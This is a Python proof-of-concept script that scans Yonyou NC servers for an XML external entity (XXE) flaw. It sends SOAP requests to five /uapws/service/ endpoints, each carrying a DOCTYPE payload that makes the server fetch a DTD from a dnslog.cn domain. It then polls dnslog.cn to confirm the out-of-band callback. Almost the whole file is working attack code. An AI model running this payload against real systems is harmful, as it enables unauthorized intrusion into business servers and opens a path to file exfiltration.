'''
Function:
    yonyounc xxe漏洞
Author:
    spmonkey
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
from gevent import monkey;monkey.patch_all()
from gevent.pool import Pool
from gevent.queue import Queue
import requests
import re
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.xxe_apis = ["nc.uap.oba.word.webservice.IServiceEntryPoint", "nc.uap.oba.wordWebservice.IServiceEntry", "nc.itf.bap.oba.IObaExcelService", "nc.itf.bap.oba.IObaWordService", "IReqQmyeToNcDataSrv"]
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.q = Queue()
        self.text_list = []
        self.proxies = proxies

    def get_dnslog(self):
        url = "http://dnslog.cn/getdomain.php"
        headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        result = requests.get(url=url, headers=headers, verify=False)
        cookie = re.search("(.*);", result.headers.get('Set-Cookie')).group(1)
        return result.text, cookie

    def get_result(self, cookie):
        url = "http://dnslog.cn/getrecords.php"
        headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
            'Cookie': cookie
        }
        result = requests.get(url=url, headers=headers, verify=False)
        return result.text

    def vuln_path(self):
        for xxe_path in self.xxe_apis:
            self.q.put(xxe_path)
        return True

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, url):
        while True:
            result_text = ""
            if self.q.qsize() == 0:
                break
            api = self.q.get_nowait()
            url_api = api.split('.')
            length = len(url_api)
            iup = 'http://'
            for i in range(length):
                if i == length - 1:
                    iup += url_api[i]
                elif i == length - 2:
                    iup += url_api[length - i - 2] + "/"
                else:
                    iup += url_api[length - i - 2] + "."
            dnslog_all = self.get_dnslog()
            dnslog = dnslog_all[0]
            target_url = url + "/uapws/service/" + api
            if url_api[length - 1] == "IObaExcelService":
                get_result = "request"
            else:
                get_result = "getResult"
            data = ""
            data += "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:iup=\"{}\">\n".format(
                iup)
            data += "<soapenv:Header/>\n"
            data += "<soapenv:Body>\n"
            data += "<iup:{}>\n".format(get_result)
            data += "<iup:string>\n"
            data += "<![CDATA[\n"
            data += "<!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM \"http://{}/ext.dtd\">%aaa;]>\n".format(dnslog)
            data += "<xxx/>]]>\n"
            data += "</iup:string>\n"
            data += "</iup:{}>\n".format(get_result)
            data += "</soapenv:Body>\n"
            data += "</soapenv:Envelope>"
            try:
                result = requests.post(url=target_url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
                if result.status_code == 200 and "<soap:Envelope" in result.text:
                    for i in range(5):
                        dnslog_result = self.get_result(dnslog_all[1])
                    if dnslog_result != "[]":
                        target = urlparse(target_url)
                        result_text += """\n        [+]    \033[32m检测到目标站点存在XML外部实体注入漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                        for request_type, request_text in dict(result.request.headers).items():
                            result_text += "\n                 {}: {}".format(request_type, request_text)
                        result_text += "\n\n                 {}".format(data)
                        self.text_list.append(result_text)
            except Exception as e:
                pass

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        url = "{}://{}".format(scheme, netloc)
        pool = Pool(5)
        if self.vuln_path():
            try:
                tasks = [pool.spawn(self.vuln, url) for i in range(5)]
                pool.join()
            except:
                pass
        return self.text_list


